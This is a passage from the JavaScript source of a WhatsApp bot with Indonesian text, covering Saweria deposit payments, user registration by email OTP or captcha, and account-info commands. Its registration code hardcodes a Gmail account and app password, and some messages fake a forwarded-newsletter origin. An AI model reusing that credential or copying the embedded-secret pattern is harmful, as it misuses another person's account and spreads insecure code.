${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo35000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('35000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo40000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('40000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo45000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('45000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo50000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('50000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo55000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('55000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo60000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('60000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo65000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('65000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo70000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('70000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo75000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('75000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo80000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('80000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo85000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('85000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo90000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('90000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo100000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('100000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'daftar':
case 'regis':
case 'register': {
if (db.data.users[m.sender].daftar) return rafatharcodereply(`Kamu sudah terdaftar!`)
if (!text) return rafatharcodereply(`*METODE DAFTAR*\n#1: ${prefix+command} -email youremail@gmail.com\n#2: ${prefix+command} -captcha\n#3: ${prefix+command} -auto`)
if (args[0] === "-email" && args[1]) {
const email = args[1];
var otp = await randomNomor(1000, 9999);
db.data.users[m.sender].otp = otp;
db.data.users[m.sender].email = `${email}`
try {
const nodemailer = require('nodemailer');
let transporter = nodemailer.createTransport({
service: 'gmail',
auth: {
user: 'nolanverifikasiotp12@gmail.com',
pass: 'wayr mpju coni obwt'
}});
let mailOptions = {
from: 'RafatharCode',
to: email,
subject: 'Kode Verifikasi OTP',
html: `
        <div style="background-color: #f4f4f4; padding: 20px; font-family: Arial, sans-serif; color: #333;">
            <div style="max-width: 600px; margin: auto; background-color: #ffffff; padding: 20px; border-radius: 12px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
                <h2 style="text-align: center; color: #333;">Kode Verifikasi OTP</h2>
                <p style="text-align: center; font-size: 18px; color: #333;">Kode OTP kamu adalah:</p>
                <div style="text-align: center; font-size: 29px; font-weight: bold; color: #4caf50; margin: 20px 0;">
                    ${otp}
                </div>
                <p style="text-align: center; color: #666; font-size: 15px;">Silakan masukkan kode ini dalam obrolan kamu dengan bot.</p>
                <p style="text-align: center; color: #666; font-size: 15px;">Jika kamu tidak meminta kode ini, abaikan email ini.</p>
                <p style="text-align: center; color: #999; margin-top: 20px; font-size: 14px;">&copy; 2024 RafatharCode. Seluruh hak cipta dilindungi.</p>
            </div>
        </div>
`};
transporter.sendMail(mailOptions, (error, info) => {
if (error) {
console.log('Error: ' + error);
m.reply('Gagal mengirim kode OTP ke email kamu');
} else {
m.reply('Kode OTP berhasil terkirim ke email kamu');
}});
} catch (err) {
m.reply('Terjadi kesalahan saat mengirim email.');
}} else if (args[0] === "-captcha") {
var angka = await randomNomor(1000, 9999)
db.data.users[m.sender].otp = angka
db.data.users[m.sender].email = '-'
try {
const { CaptchaGenerator } = require("captcha-canvas");
const captcha = new CaptchaGenerator()
.setDimension(250, 450) 
.setCaptcha({text: `${angka}`, size: 60, color: "blue"})
.setDecoy({opacity: 0.5})
.setTrace({color: "blue"});
const buffer = captcha.generateSync();
const uploadFile = { upload: rafatharcode.waUploadToServer };
var imageMessage = await prepareWAMessageMedia(
{
image: buffer,
},
uploadFile,
);
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "@newsletter",
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: `\nMasukkan kode verifikasi kamu\nSesuai seperti yang ada digambar...`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: `${monospace("CAPTCHA CODE")}`,
subtitle: '',
imageMessage: imageMessage.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: 'Jgn diedit'}],
})})}
}}, { quoted: m })
rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
} catch (err) {
m.reply('Terjadi kesalahan')
}} else if (args[0] === "-auto") {
const srlnye = createSerial(5)
var angk = await randomNomor(20, 700)
edit2("Mendaftar secara otomatis...", `*Berhasil mendaftar!*\n\n${monospace("INFORMASI  AKUN")}\nNama: Player-${angk}\nID: ${m.sender.split('@')[0]}\nSerial: ${srlnye}`)
db.data.users[m.sender].daftar = true
db.data.users[m.sender].nama = `Player-${angk}`
db.data.users[m.sender].email = '-'
db.data.users[m.sender].serial = `${srlnye}`
addRegisteredUser(m.sender, `Player-${angk}`, srlnye)
}}
break

case 'unregis':
case 'unregister': {
if (!db.data.users[m.sender].daftar) return rafatharcodereply('Kamu belum terdaftar!')
if (!args[0]) return rafatharcodereply(`Contoh: ${prefix+command} serial\n\nKetik ${prefix}infome untuk cek serial`)
if (args[0] === `${db.data.users[m.sender].serial}`) {
const lastUnregisTime = db.data.users[m.sender].lastUnregisTime || 0;
const currentTime = Date.now();
const sixHoursInMilliseconds = 6 * 60 * 60 * 1000;
if (currentTime - lastUnregisTime < sixHoursInMilliseconds) {
const remainingTime = sixHoursInMilliseconds - (currentTime - lastUnregisTime);
const hours = Math.floor(remainingTime / (60 * 60 * 1000));
const minutes = Math.floor((remainingTime % (60 * 60 * 1000)) / (60 * 1000));
return m.reply(`Kamu hanya bisa unregis setiap 6 jam sekali. Coba lagi dalam ${hours} jam dan ${minutes} menit.`);
}
edit2("Menghapus data...", "Sukses menghapus data!")
db.data.users[m.sender].daftar = false
db.data.users[m.sender].nama = `${pushname}`
db.data.users[m.sender].otp = `0`
db.data.users[m.sender].serial = `0`
db.data.users[m.sender].lastUnregisTime = currentTime;
}}
break

case 'cn':
case 'nickname': {
if (!db.data.users[m.sender].daftar) return m.reply('Kamu belum terdaftar!')
edit2("Mengubah nama...", "Sukses mengubah nama!")
db.data.users[m.sender].nama = `${text}`

}
break

case 'infome': {
let teks = `乂 ${monospace("INFORMASI  AKUN")}
 Nama: ${db.data.users[m.sender].nama}
 Profil: ${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}
 Status: ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}
 Level: ${role}
 Serial: ${db.data.users[m.sender].serial}
 
乂 ${monospace("INFORMASI  CUAN")}
 Gold: ${cekGold(m.sender, db_gold)} gold
 Saldo: Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
 Limit: ${cekLimit(m.sender, db_limit)} limit`
let bud = `{\"display_text\":\"COPY SERIAL\",\"id\":\"P\",\"copy_code\":\"${db.data.users[m.sender].serial}\"}`;
buttoncopy(m.chat, teks, bud, m)
}
break

case 'infobot': {
let teks = `乂 ${monospace("INFORMASI  LUAR")}
 Nama: ${botname}
 Owner: ${ownername}
 Status:  ${isOwner ? 'Owner' : isPremium ? 'Premium' : isReseller ? 'Reseller' : isReseller2 ? 'Reseller2' : isOwner2 ? 'Owner2' : 'User'}
 Prefix: Multi Prefix
 Versi: 4.0.4 NEW ( SUPPORT CH)
 
乂 ${monospace("INFORMASI  DALAM")}
 Platform: Chrome (Ubuntu)
 Type: Cjs (case)
 Total fitur: ${totalFitur()}
 Total error: Tidak Ada
 Total user: ${Object.values(db.data.users).length} Users`
rafatharcodereply(teks)
}
break

case 'channel': {
rafatharcodereply('Channel WhatsApp RafatharCode')
}
break

case 'emailcara': {
let nyo =  `{\"display_text\":\"DAFTAR EMAIL\",\"url\":\"https://wa.me/+${botNumber}?text=.daftar%20-email%20emailkamu@gmail.com\",\"merchant_url\":\"https://www.google.com\"}`
buttonurl(m.chat, teks, nyo, m)
}
break

case 'credit': {
if (!isOwner) return onlyOwn()
let teks = `${monospace("SCRIPT CREDITS")}\n• RafatharCode*`
sendbutton(m.chat, teks, m)
}
break

case 'linkmedia': {
if (!isOwner) return onlyOwn()
var teks = `*LINK MEDIAFIRE DOWNLOAD DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Link Download\",\"id\":\"123456789\",\"copy_code\":\"${global.upmedia}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'dana': {
if (!isOwner) return onlyOwn()
var teks = `*NOPE DANA CLICK DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'ovo': {
if (!isOwner) return onlyOwn()
var teks = `*NOPE OVO CLICK DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'gopay': {
if (!isOwner) return onlyOwn()
var teks = `*NOPE GOPAY CLICK DIBAWAH✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
},
{
"name": "cta_url",
